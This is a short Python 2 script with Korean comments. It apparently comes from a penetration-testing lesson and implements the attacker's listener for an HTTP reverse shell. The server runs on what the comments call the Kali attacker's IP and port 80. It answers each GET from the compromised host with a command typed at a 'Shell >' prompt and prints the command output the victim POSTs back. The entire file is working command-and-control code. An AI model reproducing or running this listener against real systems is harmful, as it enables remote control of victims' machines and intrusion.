from http.server import BaseHTTPRequestHandler, HTTPServer
## HTTP 서버를 간단히 구현할 수 있는 모듈

## Kali 리눅스 IP와 포트 지정(공격자의 IP와 포트다)
HOST_NAME = '192.168.32.10'
PORT_NUMBER = 80

## Myhandler 클래스 시작
class MyHandler(BaseHTTPRequestHandler):

    ##GET 요청을 받았을때
    def do_GET(self):
        command = raw_input("Shell >") ## 공격자 입력을 Command에 저장
        self.send_response(200) ## 공격대상에게 200 OK를 Return 해준다
        self.send_header("Content-Type","text/html") ##Header에 Content-type을 html 형식으로 리턴
        self.end_headers() ## 헤더 끝
        self.wfile.write(command) ## 공격자의 입력을 공격대상에게 보낸다.

    ##POST 요청을 받았을때
    def do_POST(self):
        self.send_response(200) ## 공격대상에게 200을 Return해주고
        self.end_headers() ## 헤더는 없음
        length = int(self.headers['content-length']) ## Content-Legth 길이를 저장, 입력받은 명령어를 온전히 다 받기 위함
        postVar = self.rfile.read(length) ## 전달 받은 데이터를 읽고, postVar 에 저장
        print(postVar) ##postVar를 출력

if __name__ == '__main__':
    server_class = HTTPServer
    server_address = (HOST_NAME,PORT_NUMBER)
    httpd = server_class(server_address,MyHandler) ## Kali 리눅스에 HTTP 서버를 구동

    try:
        httpd.serve_forever() ## Ctrl+c 가 입력되기 전까지 계속 구동해라!
    except KeyboardInterrupt: ## Ctrl+c 가 입력되면?
        print('[!] Server is terminated') ## 서버 종료
        httpd.server_close()
